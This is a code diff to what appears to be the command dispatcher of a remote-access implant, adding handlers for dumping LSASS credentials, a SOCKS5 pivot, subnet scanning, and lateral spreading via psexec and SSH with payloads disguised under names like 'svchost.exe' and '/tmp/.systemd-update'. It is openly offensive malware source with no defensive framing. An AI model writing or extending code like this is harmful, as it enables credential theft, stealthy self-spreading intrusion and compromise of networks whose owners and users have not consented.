@@ -147,3 +147,59 @@ class MigrateCommand(Command):
         from client.modules.stealth import migrate_to_process
         ctx.protocol.send(migrate_to_process(pid))
         return True
+
+
+class LsassDumpCommand(Command):
+    name = 'lsass_dump'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.stealth import dump_lsass
+        ctx.protocol.send(dump_lsass())
+        return True
+
+
+class Socks5Command(Command):
+    name = 'socks5'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.pivot.socks5 import start_socks5
+        ctx.protocol.send(start_socks5(ctx.protocol))
+        return True
+
+
+class ScanCommand(Command):
+    name = 'scan'
+
+    def execute(self, ctx, raw: str):
+        subnet = raw[5:].strip()
+        from client.modules.lateral.movement import scan_network
+        scan_network(ctx.protocol, subnet if subnet else None)
+        return True
+
+
+class PsexecCommand(Command):
+    name = 'psexec'
+
+    def execute(self, ctx, raw: str):
+        args = raw[7:].strip().split()
+        if len(args) < 3:
+            ctx.protocol.send('[-] Usage: psexec <ip> <user> <pass> [payload_path]')
+            return True
+        from client.modules.lateral.movement import psexec_spread
+        payload = args[3] if len(args) > 3 else 'svchost.exe'
+        psexec_spread(ctx.protocol, args[0], args[1], args[2], payload)
+        return True
+
+
+class SSHSprdCommand(Command):
+    name = 'ssh_spread'
+
+    def execute(self, ctx, raw: str):
+        args = raw[11:].strip().split()
+        if len(args) < 3:
+            ctx.protocol.send('[-] Usage: ssh_spread <ip> <user> <pass> [payload]')
+            return True
+        from client.modules.lateral.movement import ssh_spread
+        payload = args[3] if len(args) > 3 else '/tmp/.systemd-update'
+        ssh_spread(ctx.protocol, args[0], args[1], args[2], payload)
+        return True
